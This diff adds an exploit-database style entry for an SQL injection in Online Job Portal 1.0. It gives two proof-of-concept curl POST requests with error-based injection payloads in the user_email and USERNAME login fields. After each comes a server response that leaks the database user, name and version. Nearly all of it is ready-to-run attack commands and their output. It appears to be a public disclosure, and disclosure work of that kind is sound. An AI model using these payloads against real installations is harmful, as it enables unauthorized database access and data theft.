@@ -1,0 +1,56 @@
+# Exploit Title: Online Job Portal 1.0 - 'user_email' SQL Injection
+# Dork: N/A
+# Date: 2020-02-06
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/php/13850/online-job-portal-phppdo.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/jobportal.zip
+# Version: 1.0
+# Tested on: Linux
+# CVE: N/A
+
+# POC: 
+# 1)
+# 
+curl -i -s -k -X $'POST' \
+    -H $'Host: localhost' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 282' -H $'Cookie: PHPSESSID=8aftj770keh6dlgj5sd4a1t5i4' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=8aftj770keh6dlgj5sd4a1t5i4' \
+    --data-binary $'user_email=1\'%20aND%20(SeLeCT%201%20FRoM(SeLeCT%20CoUNT(*),CoNCaT((SeLeCT%20(eLT(2=2,1))),CoNCaT_WS(0x203a20,USeR(),DaTaBaSe(),veRSIoN()),FLooR(RaND(0)*2))x%20FRoM%20INFoRMaTIoN_SCHeMa.PLUGINS%20GRoUP%20BY%20x)a)--%20VerAyari&user_pass=0x5665724179617269&btnLogin=0x5665724179617269' \
+    $'http://localhost/[PATH]/admin/login.php'
+# 
+HTTP/1.1 200 OK
+Date: Wed, 05 Feb 2020 19:18:45 GMT
+Server: Apache/2.4.38 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev Perl/v5.16.3
+X-Powered-By: PHP/5.6.40
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 3251
+Connection: close
+Content-Type: text/html; charset=UTF-8
+.............
+<!-- /.login-box -->
+Failed to get query handle: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '1root@localhost : exploitdb : 10.1.38-MariaDB1' for key 'group_key'
+# 
+
+# POC: 
+# 2)
+# 
+curl -i -s -k -X $'POST' \
+    -H $'Host: localhost' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 237' -H $'Cookie: PHPSESSID=8aftj770keh6dlgj5sd4a1t5i4' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=8aftj770keh6dlgj5sd4a1t5i4' \
+    --data-binary $'USERNAME=1\'%20aND%20(SeLeCT%201%20FRoM(SeLeCT%20CoUNT(*),CoNCaT((SeLeCT%20(eLT(2=2,1))),CoNCaT_WS(0x203a20,USeR(),DaTaBaSe(),veRSIoN()),FLooR(RaND(0)*2))x%20FRoM%20INFoRMaTIoN_SCHeMa.PLUGINS%20GRoUP%20BY%20x)a)--%20verayari&PASS=VerAyari' \
+    $'http://localhost/[PATH]/process.php?action=login'
+# 
+HTTP/1.1 200 OK
+Date: Wed, 05 Feb 2020 19:17:19 GMT
+Server: Apache/2.4.38 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev Perl/v5.16.3
+X-Powered-By: PHP/5.6.40
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 167
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Failed to get query handle: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '1root@localhost : exploitdb : 10.1.38-MariaDB1' for key 'group_key'
+#
